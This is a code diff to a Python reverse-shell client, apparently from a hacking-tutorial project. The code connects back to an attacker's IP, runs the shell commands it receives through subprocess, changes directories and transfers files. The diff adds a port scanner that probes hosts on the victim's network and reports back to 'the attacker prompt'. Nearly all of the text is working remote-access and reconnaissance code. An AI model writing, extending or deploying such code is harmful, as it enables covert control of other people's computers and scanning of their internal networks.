@@ -17,6 +17,23 @@ def transfer(s,path):
     else:
         s.send('Unable to find out the file')
 
+def scanner(s,ip,ports):
+    scan_result = ''
+    for port in ports.split(','): # ports will be comma separated
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generating a TCP connection
+            output = sock.connect_ex((ip, int(port))) # setting values
+            # checking output
+            if output == 0:
+                scan_result = scan_result + "[+] Port: " + port + " is opened" + '\n' # concat message
+            else:
+                scan_result = scan_result + "[-] Port: " + port + " is closed or Hostname not found" + '\n' # concat message
+            sock.close() # closing socket
+        except Exception as e:
+            pass
+        # send commands to the attacker prompt
+        s.send(scan_result)
+
 def connect(ip):
    # AF_INET as a pair of (host,port) | SOCK_STREAM (default mode)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -41,6 +58,10 @@ def connect(ip):
             code, directory = command.split(" ") # spliting by space
             os.chdir(directory) # changing directory
             s.send("[+] CWD is now: " + os.getcwd()) # send message to attacker
+        elif 'scan' in command:
+            command = command[5:] # splitting the command from the full address
+            ip,ports = command.split(":")
+            scanner(s,ip,ports) # going to the scanner function
         else:
             # piping the stdout the the subprocess module using the Shell
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
